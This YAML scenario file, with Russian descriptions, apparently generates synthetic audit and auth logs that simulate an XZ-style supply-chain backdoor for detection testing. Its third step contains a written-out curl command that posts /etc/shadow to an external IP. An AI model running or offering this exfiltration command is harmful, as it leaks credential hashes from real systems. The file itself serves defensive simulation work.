name: "Linux Vector 4: Supply Chain Backdoor (XZ Style)"
description: "Атака на цепочку поставок (по типу XZ Utils). Легитимный администратор устанавливает системное обновление, которое содержит зараженную библиотеку. Бэкдор встраивается в SSH-демон и позволяет атакующему войти без пароля."
global_context:
  host.name: "mil02"
  host.domain: "corp.local.uz"
  user.name: "root"
steps:
  - id: "l_v4_step1_malicious_update"
    template: "linux_auditd_execve"
    description: "Установка скомпрометированного системного пакета из официального репозитория через пакетный менеджер apt."
    delay_from_prev: "0s"
    fields:
      host_name: "mil02"
      host_ip: "192.168.100.6"
      user_name: "root"
      process_name: "/usr/bin/apt-get"
      parent_path: "/usr/bin/bash"
      process_command_line: "apt-get upgrade -y"
      mitre_technique: "T1195.002"

  - id: "l_v4_step2_backdoor_auth"
    template: "linux_syslog_auth"
    description: "Скрытая аутентификация атакующего через внедренный в SSH-демон бэкдор (в обход PAM)."
    delay_from_prev: "1h"
    depends_on: "l_v4_step1_malicious_update"
    fields:
      host_name: "mil02"
      host_ip: "192.168.100.6"
      source_ip: "198.51.100.42"
      user_name: "root"
      auth_method: "publickey"
      status: "Accepted"
      mitre_technique: "T1078.001"

  - id: "l_v4_step3_data_exfiltration"
    template: "linux_auditd_execve"
    description: "Выгрузка данных с сервера через защищенное соединение curl после успешного входа."
    delay_from_prev: "5m"
    depends_on: "l_v4_step2_backdoor_auth"
    fields:
      host_name: "mil02"
      host_ip: "192.168.100.6"
      user_name: "root"
      process_name: "/usr/bin/curl"
      parent_path: "/usr/sbin/sshd"
      process_command_line: "curl -X POST -d @/etc/shadow https://198.51.100.42/upload"
      mitre_technique: "T1048.003"
